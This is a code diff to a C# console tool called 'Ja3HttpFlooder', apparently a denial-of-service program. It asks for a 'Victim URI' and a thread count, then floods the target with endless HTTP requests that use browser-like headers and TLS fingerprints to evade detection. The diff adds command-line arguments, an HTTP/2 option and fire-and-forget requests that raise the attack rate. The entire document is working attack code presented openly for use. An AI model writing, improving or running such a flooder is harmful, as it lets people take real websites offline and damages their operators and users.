@@ -2,15 +2,30 @@
 
 public class Program
 {
-    public static void Main()
+    public static void Main(string[] args)
     {
         Console.Title = "Ja3HttpFlooder | Made by https://github.com/ZygoteCode/";
+        string URI = "";
+        int threads = 0;
+        bool useHttp2 = false;
 
-        Console.Write("Victim URI > ");
-        string URI = Console.ReadLine();
+        if (args.Length == 0)
+        {
+            Console.Write("Victim URI > ");
+            URI = Console.ReadLine();
 
-        Console.Write("Attack threads > ");
-        int threads = int.Parse(Console.ReadLine());
+            Console.Write("Attack threads > ");
+            threads = int.Parse(Console.ReadLine());
+
+            Console.Write("Use HTTP/2? (y/n) > ");
+            useHttp2 = Console.ReadLine().Equals("y");
+        }
+        else
+        {
+            URI = args[0];
+            threads = int.Parse(args[1]);
+            useHttp2 = args[2].Equals("y");
+        }
 
         Console.WriteLine("Attack started. Press CTRL + C to stop it.");
 
@@ -21,9 +36,11 @@ public class Program
                 while (true)
                 {
                     Ja3MessageHandler handler = new Ja3MessageHandler();
-                    handler.EnableHttp2 = true;
+
+                    handler.EnableHttp2 = useHttp2;
                     handler.Timeout = 10000;
                     handler.UseCookies = false;
+                    handler.AllowAutoRedirect = true;
 
                     using (HttpClient client = new HttpClient(handler))
                     {
@@ -64,11 +81,11 @@ public class Program
                             client.DefaultRequestHeaders.Add("TE", "trailers");
                             client.DefaultRequestHeaders.Add("Upgrade-Insecure-Requests", "1");
                             client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36");
-                            client.GetStringAsync(URI).GetAwaiter().GetResult();
+                            client.GetStringAsync(URI);
                         }
                         catch
                         {
-
+                            
                         }
                     }
                 }
